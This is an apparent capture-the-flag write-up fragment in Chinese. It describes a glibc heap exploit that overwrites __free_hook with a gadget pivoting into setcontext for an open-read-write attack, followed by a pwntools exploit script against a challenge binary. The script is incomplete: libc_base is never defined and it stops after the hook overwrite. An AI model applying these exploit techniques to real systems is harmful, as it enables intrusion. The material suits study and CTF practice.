需要跳到<setcontext+61>来扩大控制范围，所以如何控制rdx的值就很关键。可以找到一个很有用的gadget：

mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]

我们可以覆盖free_hook为该gadget的地址，free(chunk)的时候布置好chunk内容通过mov rdx, qword ptr [rdi + 8]来控制rdx；call qword ptr [rdx + 0x20]再跳到<setcontext+61>来orw。

EXP

from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process('./gun')
#p=remote('123.57.209.176',30772)
elf = ELF('./gun')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.log_level = 'debug'

def shoot(idx):
    p.sendlineafter('Action> ',str(1))
    p.sendlineafter('Shoot time: ',str(idx))

def load(idx):
    p.sendlineafter('Action> ',str(2))
    p.sendlineafter('load?',str(idx))

def buy(pri,con):
    p.sendlineafter('Action> ',str(3))
    p.sendlineafter('price: ',str(pri))
    global money
    money = 0x1000
    money = money - pri
    p.info("last money: "+hex(money))
    #money - price >> 0x3f == 0
    #price > 0x10 && price < 0x501
    p.sendlineafter('Name: ',con)

p.recvuntil('Your name: ')
p.sendline(b'a'*0x18)


for i in range(7):
    buy(0x20,b'a'*0x8)    #0-6
for i in range(7):
    load(6-i)
shoot(7)

for i in range(7):
    buy(0x80,'a'*0x80)   #0-6
buy(0x80,'b'*0x80)       #7 -> prev
buy(0x80,'a'*0x80)       #8 -> victim
buy(0x30,'a'*0x30)       #9
for i in range(9):
    load(8-i)
shoot(9)

buy(0x80,'\xf0')

for i in range(7):
    buy(0x20,'a'*0x8)   #1-7
for i in range(7):
    load(7-i)
shoot(7)
shoot(1)
buy(0xa0,'a'*0x8)          #1
buy(0x30,'a'*0x8)          #2
buy(0x30,'b'*0x8)          #3
load(2)

shoot(2)

free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.symbols['setcontext']

buy(0xa0,'a'*0x80+p64(0x90)*2+p64(free_hook)) #1
